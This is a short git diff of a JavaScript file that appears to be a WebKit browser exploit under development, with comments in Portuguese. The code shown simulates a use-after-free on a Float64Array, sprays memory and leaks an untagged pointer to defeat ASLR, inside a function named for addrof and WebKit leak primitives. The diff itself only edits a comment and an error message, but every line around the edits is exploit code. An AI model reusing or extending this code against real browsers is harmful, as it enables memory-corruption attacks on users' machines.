@@ -416,7 +416,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         // 2. Forçar coleta de lixo para liberar a memória do objeto vítima.
         // O `victim_float64_array` (e seu `ArrayBuffer` subjacente) será liberado se não houver outras referências fortes.
         // Remover referências fortes para o ArrayBuffer e a View
-        let dangling_reference_holder = victim_float64_array; // Manter uma referência "dangling"
+        let dangling_reference_holder = victim_float64_array; // Mudar de 'const' para 'let'
         // Zere as referências "fortes" para o ArrayBuffer para que o GC possa coletá-lo
         // NOTA: No exploit real, a confusão de tipos ocorre ANTES ou DURANTE a liberação.
         // Aqui estamos simulando um UAF liberando e depois pulverizando.
@@ -513,7 +513,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(`[UAF LEAK] Ponteiro vazado (original): ${leaked_val_int64_raw.toString(true)}. HIGH inesperado (0x${leaked_val_int64_raw.high().toString(16)}). Tentando untag: ${untagged_leaked_ptr.toString(true)}`, "warn");
 
         if (untagged_leaked_ptr.equals(AdvancedInt64.Zero) || untagged_leaked_ptr.equals(AdvancedInt64.NaNValue)) {
-            const errorMsg = `[UAF LEAK] ERRO CRÍTICO no vazamento de ASLR via UAF/TC: Após untagging, o ponteiro (${untagged_leaked_ptr.toString(true)}) ainda é inválido. Isso pode indicar uma tag incorreta ou um valor lido não-ponteiro.`;
+            const errorMsg = `[UAF LEAK] ERRO CRÍTICO: Após untagging, o ponteiro (${untagged_leaked_ptr.toString(true)}) ainda é inválido. Isso pode indicar uma tag incorreta ou um valor lido não-ponteiro.`;
             logFn(errorMsg, "critical");
             throw new Error(errorMsg);
         }
